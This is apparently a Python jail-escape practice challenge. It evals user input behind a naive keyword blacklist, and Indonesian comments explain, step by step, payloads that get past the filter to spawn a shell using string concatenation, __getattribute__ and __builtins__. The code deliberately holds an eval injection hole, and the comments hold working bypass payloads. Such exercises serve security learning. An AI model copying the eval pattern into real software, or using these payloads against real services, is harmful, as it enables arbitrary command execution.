expr = input("Put syntax to get shell: \n; ")
blacklist = ['__import__', 'system', 'sh', 'os']

for char in blacklist:
    if char in expr:
        print(f"U cant use \"{char}\"")
        exit()
eval(expr)

# default syntax untuk mendapatkan shell seperti dibawah ini
# __import__('os').system('sh')

# problem dan solusi 1:
# string + string 
# __import__('os').system('sh') MENJADI __import__('o'+'s').system('s'+'h') 

# problem dan solusi 2:
# __import__ dan system juga ikut terkena blacklist
# maka caranya adalah menggunakan builtins function yaitu __getattribute__ untuk memanggil system sebagai string
# __import__('o'+'s').system('s'+'h') MENJADI __import__('o'+'s').__getattribute__('sys'+'tem')('s'+'h')

# problem dan solusi 3:
# __import__ juga ikut diblacklist, tapi jika import tiba-tiba diubah __getattribute__ juga tidak bisa, maka kita panggil dulu __builtins__ kemudian baru __getattribute__
# __import__('o'+'s').__getattribute__('sys'+'tem')('s'+'h') MENJADI __builtins__.__getattribute__('__imp'+'ort__')('o'+'s').__getattribute__('sys'+'tem')('s'+'h')